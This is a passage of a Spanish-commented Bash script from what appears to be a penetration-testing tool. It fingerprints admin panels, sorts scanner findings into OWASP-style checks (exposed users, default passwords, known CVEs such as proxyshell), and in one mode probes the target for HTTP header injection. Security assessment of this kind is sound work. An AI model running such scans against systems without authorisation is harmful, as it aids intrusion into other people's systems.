			#web_fingerprint=`webData.pl -t $host -d "/$path_web2" -p $port -s $proto_http -e todo -l /dev/null -r 4 2>/dev/null | sed 's/\n//g'`
			web_fingerprint=`webData -proto $proto_http -target $host -port $port -path "/$path_web2" -logFile /dev/null -maxRedirect 4 2>/dev/null | sed 's/\n//g'`
			#echo "web_fingerprint ($web_fingerprint)" > .enumeracion/"$host"_"$port-$path_web_sin_slash"_webFingerprint.txt

			web_fingerprint=`echo "$web_fingerprint" | tr '[:upper:]' '[:lower:]' | tr -d ";"` # a minusculas y eliminar  ;
			#echo "web_fingerprint ($web_fingerprint)"
			#############
			if [[ ${web_fingerprint} == *"404 not found"* ]]; then
				echo -e "\t[+] Falso positivo (404) "
			else
				echo "$url;$web_fingerprint" >> servicios/admin-web2.txt
			fi #404
		fi

	done < servicios/admin-web-url.txt
fi


sort servicios/admin-web2.txt 2>/dev/null | uniq > servicios/admin-web-fingerprint.txt
rm servicios/admin-web2.txt 2>/dev/null


if [[ "$ESPECIFIC" == "1" ]];then
	### OWASP Verification Standard Part 2###

	#CS-01 Variable en GET
	egrep 'token|session' logs/enumeracion/"$host"_parametrosGET_uniq_final.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-01.txt 2>/dev/null

	#CS-39	API REST y api
	grep -i 'api' .vulnerabilidades2/"$host"_"$port"_archivosPeligrosos.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-39.txt 2>/dev/null

	#CS-40 Divulgación de información
	grep -ira 'vulnerabilidad=divulgacionInformacion' logs | egrep -v '404|403'| awk {'print $2'} > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-40.txt
	grep -ira 'vulnerabilidad=debugHabilitado' logs |  egrep -v '404|403'| awk {'print $2'} >> .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-40.txt
	grep -ira 'vulnerabilidad=MensajeError' logs |  egrep -v '404|403'| awk {'print $2'} >> .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-40.txt
	grep -ira 'vulnerabilidad=IPinterna' logs | egrep -v '404|403'| awk {'print $2'} >> .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-40.txt
	grep -ira 'vulnerabilidad=phpinfo' logs |  egrep -v '404|403' | awk {'print $2'} >> .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-40.txt
	grep -ira 'vulnerabilidad=backdoor' logs |  egrep -v '404|403' | awk {'print $2'} >> .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-40.txt

	for file in $(ls .enumeracion2 .vulnerabilidades2 | grep wpVersion ); do cat .vulnerabilidades2/$file .enumeracion2/$file 2>/dev/null ; done | perl -ne '$_ =~ s/\n//g; print "Wordpress version:$_\n"' >> .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-40.txt
	for file in $(ls .enumeracion2 .vulnerabilidades2 | egrep '_perdidaAutenticacion|_webarchivos|_SharePoint|_webdirectorios|_archivosSAP|_webservices|_archivosTomcat|_webserver|_archivosCGI|_CGIServlet|_sapNetweaverLeak|_custom' ); do cat .vulnerabilidades2/$file .enumeracion2/$file 2>/dev/null ; done | grep -v 'ListadoDirectorios' >> .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-40.txt
	cp .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-40.txt logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-40.txt 2>/dev/null


	#CS-41 Exposición de usuarios
	grep -ira 'vulnerabilidad=ExposicionUsuarios' logs | awk {'print $2'} > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-41.txt
	for file in $(ls .enumeracion2 .vulnerabilidades2 | grep _wpUsers ); do cat .vulnerabilidades2/$file .enumeracion2/$file 2>/dev/null ; done | perl -ne '$_ =~ s/\n//g; print "Usuarios:$_\n"' >> .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-41.txt
	cp .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-41.txt logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-41.txt 2>/dev/null


	#CS-44 Servidores
	for file in $(ls .enumeracion2 .vulnerabilidades2 | egrep '_archivosPeligrosos|_backupweb' ); do cat .vulnerabilidades2/$file .enumeracion2/$file 2>/dev/null ; done  > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-44.txt
	cat .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-44.txt >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-44.txt 2>/dev/null

	# CS-51-2 headers
	cat .vulnerabilidades2/"$host"_"$port"_vulTLS.txt 2>/dev/null | grep -v 'HSTS' > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-51-2.txt 2>/dev/null
	cat .vulnerabilidades2/"$host"_"$port"_confTLS.txt >> .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-51-2.txt 2>/dev/null


	#CS-46 Archivos por defecto
	grep -ira 'vulnerabilidad=contenidoPrueba' logs | awk {'print $2'} > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-46.txt
	for file in $(ls .enumeracion2 .vulnerabilidades2 | egrep '_archivosDefecto|_passwordDefecto' ); do cat .vulnerabilidades2/$file .enumeracion2/$file 2>/dev/null ; done  >> .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-46.txt
	cp .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-46.txt logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-46.txt 2>/dev/null

	#CS-48 Servidor mal configurado
	grep -ira 'vulnerabilidad=ListadoDirectorios' logs | awk {'print $2'} | uniq > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-48.txt
	for file in $(ls .enumeracion2 .vulnerabilidades2 | egrep '_heartbleed|_tomcatNuclei|_apacheNuclei|_IIS~CVE~2017~7269|_citrixVul|_apacheStruts|_shortname|_apacheTraversal' ); do cat .vulnerabilidades2/$file .enumeracion2/$file 2>/dev/null ; done | perl -ne '$_ =~ s/\n//g; print "Vulnerabilidad server:$_\n"' >> .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-48.txt
	cp .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-48.txt logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-48.txt 2>/dev/null

	#CS-63 Software obsoleto
	egrep -ira "\.class\"|\.class\'|\.class |\.nmf\"|\.nmf\'|\.nmf |\.xap\"|\.xap\'|\.xap |\.swf\"|\.swf\'|\.swf |x-nacl|<object |application\/x-silverlight" webClone/"$host"/ > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-63.txt
	cp .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-63.txt logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-63.txt 2>/dev/null

	#CS-56 Funciones peligrosas
	egrep -ira " eval\(" webClone/"$host"/ > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-56.txt
	cp .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-56.txt logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-56.txt 2>/dev/null

	# CS-69 Vulnerabilidades conocidas
	for file in $(ls .enumeracion2 .vulnerabilidades2 | egrep '_droopescan|_joomlaNuclei|_wordpressNuclei|_drupalNuclei|_redirectContent|_xml-rpc-habilitado|_wordpressPlugins|_wordpressCVE~2022~21661|_wordpressGhost|_proxynoshell|_proxyshell|_registroHabilitado|_sap-scan' ); do cat .vulnerabilidades2/$file .enumeracion2/$file 2>/dev/null ; done | perl -ne '$_ =~ s/\n//g; print "Vulnerabilidad app:$_\n"' > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-69.txt
	cp .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-69.txt logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-69.txt 2>/dev/null

	if [[ "$MODE" == "total" ]]; then
		# CS-62 HTTP header injection
		echo -e "\t[+]HTTP header injection"
		headi -u $URL > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-62.txt
		grep 'Vul' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-62.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-62.txt
	fi
fi

insert_data
# delete empty files
find servicios -size  0 -print0 |xargs -0 rm 2>/dev/null
#Insertar paneles administrativos servicios/web-admin-fingerprint.txt
insert_data_admin 2>/dev/null
